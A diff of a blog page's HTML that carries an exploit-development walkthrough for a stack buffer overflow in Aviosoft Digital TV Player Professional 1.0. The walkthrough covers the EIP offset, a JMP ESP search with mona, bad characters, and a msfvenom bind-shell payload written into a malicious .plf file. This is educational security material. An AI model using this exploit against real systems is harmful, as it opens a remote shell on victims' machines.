@@ -10,7 +10,7 @@
   <meta itemprop="description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger AviosoftDTVPlayerPro Triggering the overflow After some fuzzing the basic exploit can be create with the following python code. 1 #!/usr/bin/python -w 2 3 buffer = &quot;A&quot; * 2000 4 5 f = open(&quot;evil.plf&quot;,&quot;w&quot;) 6 f.write(buffer) 7 f.close() Opening this file with the vulnerable application results in an access violation with the following register values. Great, the EIP is under our control. Identifying EIP Offset In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.">
 
   
-  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,hacking,hashcat,offensive-security,protostar,reverse-engineering,sans,seh," />
+  <meta itemprop="keywords" content="certifications,challenge,ctf,dns,exploit,exploit-exercises,golang,hacking,hashcat,information-gathering,offensive-security,protostar,reverse-engineering,sans,seh," />
   
     <meta itemprop="wordCount" content="483">
   
@@ -39,18 +39,18 @@
   
 
 
-  <meta name="generator" content="Hugo 0.15" />
+  <meta name="generator" content="Hugo 0.16" />
   <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
-  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
-  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
+  <link href="http://camelinc.info/css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info/css/hc.css" rel="stylesheet">
 
   
-  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="http://camelinc.info/css/zenburn.css" type="text/css" media="screen" />
 
   
 
   
-  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
+  <link rel="stylesheet" href="http://camelinc.info/lightbox/css/lightbox.css" type="text/css" media="screen">
 
 
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
@@ -60,9 +60,8 @@
  
 
 
-  <body>
+<body>
 
-  
 <div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
   <div id = "wrapper">
 
@@ -77,11 +76,9 @@
           </button>
           <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
         </div>
-
         <div class="navbar-collapse collapse">
           <ul class="nav navbar-nav">
 					
-          <h2>http://camelinc.info/</h2>
 					
 					<li><a href="http://camelinc.info/about">About </a></li>
 					
@@ -91,6 +88,8 @@
         </div>
       </div>
     </div>
+
+
 
        
        <div id="sidebar-wrapper">
@@ -130,14 +129,13 @@
      <div class="container">
 
 
-
   <div id="article">
     <div class="article-title">Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</div>
     <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-05-26</small></p> <hr/>
     <div class="post">
       
 
-<h1 id="prequisites:dc6c0547b941be7f8dbf8bb054d9be75">Prequisites</h1>
+<h1 id="prequisites">Prequisites</h1>
 
 <ul>
 <li>Windows XP SP3 (en-us)</li>
@@ -145,7 +143,7 @@
 <li><a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/55740fe6c4e56674125a1968a139ed36-AviosoftDTVPlayerPro.exe">AviosoftDTVPlayerPro</a></li>
 </ul>
 
-<h1 id="triggering-the-overflow:dc6c0547b941be7f8dbf8bb054d9be75">Triggering the overflow</h1>
+<h1 id="triggering-the-overflow">Triggering the overflow</h1>
 
 <p>After some fuzzing the basic exploit can be create with the following python code.</p>
 
@@ -173,7 +171,7 @@
 
 <p>Great, the EIP is under our control.</p>
 
-<h1 id="identifying-eip-offset:dc6c0547b941be7f8dbf8bb054d9be75">Identifying EIP Offset</h1>
+<h1 id="identifying-eip-offset">Identifying EIP Offset</h1>
 
 <p>In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.</p>
 
@@ -223,7 +221,7 @@ The output is depicted in the following screenshot.</p>
 <p>Now we know, that we can overwrite the EIP after 260 bytes.
 After updating the initial script, we can now exactly overwrite EIP.</p>
 
-<p>
+
 
 <figure >
     <a href="/img/post/2014/dvdxplayer/overwrite_eip.png" data-lightbox="default" data-title="Overwriting EIP with BBBB" >
@@ -231,20 +229,20 @@ After updating the initial script, we can now exactly overwrite EIP.</p>
     </a>
 </figure>
 
-</p>
 
-<h1 id="controlling-eip:dc6c0547b941be7f8dbf8bb054d9be75">Controlling EIP</h1>
+
+<h1 id="controlling-eip">Controlling EIP</h1>
 
 <p>Luckily, ESP points to the bytes after the BBBB.
 So let&rsquo;s identify a location that stores a suiteable JMP ESP.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
 </code></pre></div>
-</p>
+
 
 <p>Mona.py can list all suitable JMP instructions.</p>
 
-<p>
+
 
 <figure >
     <a href="/img/post/2014/dvdxplayer/jmp_esp.png" data-lightbox="default" data-title="JMP ESP instructions available in process memory." >
@@ -252,22 +250,22 @@ So let&rsquo;s identify a location that stores a suiteable JMP ESP.</p>
     </a>
 </figure>
 
-</p>
+
 
 <p>Let&rsquo;s choose one after identifying the bad characters.</p>
 
-<h1 id="identifying-bad-characters:dc6c0547b941be7f8dbf8bb054d9be75">Identifying Bad Characters</h1>
+<h1 id="identifying-bad-characters">Identifying Bad Characters</h1>
 
 <p>Next, we need to verify the valid charset for the exploit.
 Let&rsquo;s create a byte pattern and compare it against loaded data.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00&#39;</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00&#39;</span>
 </code></pre></div>
-</p>
+
 
 <p>The bad characters \x0A was identified at 0x0012f489.</p>
 
-<p>
+
 
 <figure >
     <a href="/img/post/2014/dvdxplayer/bad_chars.png" data-lightbox="default" data-title="The pattern stops at offset 0x0012f489, which indicates a bad character." >
@@ -275,29 +273,29 @@ Let&rsquo;s create a byte pattern and compare it against loaded data.</p>
     </a>
 </figure>
 
-</p>
+
 
 <p>Iterating the previous steps until finally, all bad characters have been identified.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f c:\logs\DVDXPlayer\bytearray.bin</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f c:\logs\DVDXPlayer\bytearray.bin</span>
 <span class="go">[+] Comparing with memory at location : 0x0012f480 (Stack)</span>
 <span class="go">!!! Hooray, normal shellcode unmodified !!!</span>
 <span class="go">Bytes omitted from input: 00 0a 1a</span>
 </code></pre></div>
-</p>
 
-<h1 id="adding-shellcode:dc6c0547b941be7f8dbf8bb054d9be75">Adding Shellcode</h1>
+
+<h1 id="adding-shellcode">Adding Shellcode</h1>
 
 <p>Finally, let&rsquo;s add a custom payload to the exploit code.
 With metasploit, we can just do that and update the python PoC.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39;</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39;</span>
 </code></pre></div>
-</p>
 
-<h1 id="the-exploit:dc6c0547b941be7f8dbf8bb054d9be75">The Exploit</h1>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
+<h1 id="the-exploit">The Exploit</h1>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
 <span class="lineno"> 2 </span>
 <span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
 <span class="lineno"> 4 </span>
@@ -339,7 +337,7 @@ With metasploit, we can just do that and update the python PoC.</p>
 <span class="lineno">40 </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
 <span class="lineno">41 </span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div>
-</p>
+
 
 <p>By loading the plf file, the payload is executed.</p>
 
@@ -353,7 +351,7 @@ With metasploit, we can just do that and update the python PoC.</p>
 
 </p>
 
-<h1 id="links-and-references:dc6c0547b941be7f8dbf8bb054d9be75">Links and References</h1>
+<h1 id="links-and-references">Links and References</h1>
 
 <ul>
 <li><a href="http://www.exploit-db.com/exploits/18109/">EDB-ID: 18109</a></li>
